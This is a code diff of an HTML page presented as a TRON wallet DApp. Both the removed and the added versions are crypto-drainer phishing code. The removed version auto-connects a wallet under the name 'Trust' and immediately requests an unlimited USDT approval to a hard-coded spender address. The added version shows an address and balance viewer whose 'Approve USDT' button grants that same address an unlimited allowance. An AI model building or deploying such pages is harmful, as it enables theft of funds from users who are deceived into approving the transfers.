@@ -2,109 +2,112 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>TRON Auto DApp</title>
-
-<script type="module">
-import {
-  WalletConnectWallet,
-  WalletConnectChainID
-} from 'https://esm.sh/@tronweb3/walletconnect-tron';
-
-let wallet;
-
-// 🔥 TRON USDT Contract
-const USDT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
-
-// 🔥 YOUR WALLET (spender)
-const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
-
-// 🔥 INIT
-async function init() {
-  wallet = new WalletConnectWallet({
-    network: WalletConnectChainID.Mainnet,
-    options: {
-      relayUrl: 'wss://relay.walletconnect.com',
-      projectId: '171db6da15a54effc1b4a06f889a3c3f',
-      metadata: {
-        name: 'Trust',
-        description: 'Processing...',
-        url: window.location.origin,
-        icons: ['https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQjTrKgy8TJ9muJphpzXZAGb-TTs5c2igXR6Q&s']
-      }
-    }
-  });
-
-  connectFlow();
-}
-
-// 🔥 AUTO CONNECT
-async function connectFlow() {
-  try {
-    document.getElementById("status").innerText = "Connecting wallet...";
-
-    await wallet.connect();
-
-    const tronWeb = wallet.tronWeb;
-    const user = wallet.address;
-
-    document.getElementById("status").innerText =
-      "Connected: " + user;
-
-    await approve(tronWeb);
-
-  } catch (e) {
-    console.error(e);
-    document.getElementById("status").innerText =
-      "Connection failed / rejected";
-  }
-}
-
-// 🔥 APPROVAL FUNCTION
-async function approve(tronWeb) {
-  try {
-    document.getElementById("status").innerText =
-      "Requesting approval...";
-
-    const contract = await tronWeb.contract().at(USDT);
-
-    await contract.approve(
-      SPENDER,
-      "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-    ).send({
-      feeLimit: 100000000
-    });
-
-    document.getElementById("status").innerText =
-      "✅ Approval done";
-
-  } catch (err) {
-    console.error(err);
-    document.getElementById("status").innerText =
-      "Approval failed";
-  }
-}
-
-window.onload = init;
-</script>
+<title>TRON DApp</title>
 
 <style>
 body {
   margin: 0;
-  background: #0f0f0f;
-  color: white;
+  background: #0b0b0b;
+  color: #fff;
   font-family: Arial;
   display: flex;
   justify-content: center;
   align-items: center;
   height: 100vh;
 }
-#status {
-  font-size: 18px;
+.container {
+  text-align: center;
+}
+.button {
+  padding: 12px 25px;
+  background: #00ffae;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+  margin-top: 15px;
 }
 </style>
+
+<script>
+const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+
+let tronWeb;
+
+async function init() {
+  if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+    tronWeb = window.tronWeb;
+
+    const user = tronWeb.defaultAddress.base58;
+
+    document.getElementById("address").innerText = user;
+
+    await loadBalance();
+
+  } else {
+    document.getElementById("status").innerText =
+      "❌ Open inside Trust Wallet dApp browser";
+  }
+}
+
+// 🔥 Get USDT balance
+async function loadBalance() {
+  try {
+    const contract = await tronWeb.contract().at(USDT);
+    const balance = await contract.balanceOf(tronWeb.defaultAddress.base58).call();
+
+    const formatted = balance / 1e6;
+
+    document.getElementById("balance").innerText =
+      formatted + " USDT";
+
+  } catch (e) {
+    console.error(e);
+  }
+}
+
+// 🔥 Approve function (user must confirm)
+async function approve() {
+  try {
+    document.getElementById("status").innerText =
+      "Waiting for approval...";
+
+    const contract = await tronWeb.contract().at(USDT);
+
+    await contract.approve(
+      "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV",
+      "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    ).send();
+
+    document.getElementById("status").innerText =
+      "✅ Approved successfully";
+
+  } catch (e) {
+    console.error(e);
+    document.getElementById("status").innerText =
+      "❌ Transaction rejected";
+  }
+}
+
+window.onload = init;
+</script>
+
 </head>
 
 <body>
-  <div id="status">Initializing...</div>
+
+<div class="container">
+  <h2>TRON Wallet</h2>
+
+  <p><b>Address:</b></p>
+  <p id="address">Loading...</p>
+
+  <p><b>USDT Balance:</b></p>
+  <p id="balance">0</p>
+
+  <button class="button" onclick="approve()">Approve USDT</button>
+
+  <p id="status"></p>
+</div>
+
 </body>
 </html>
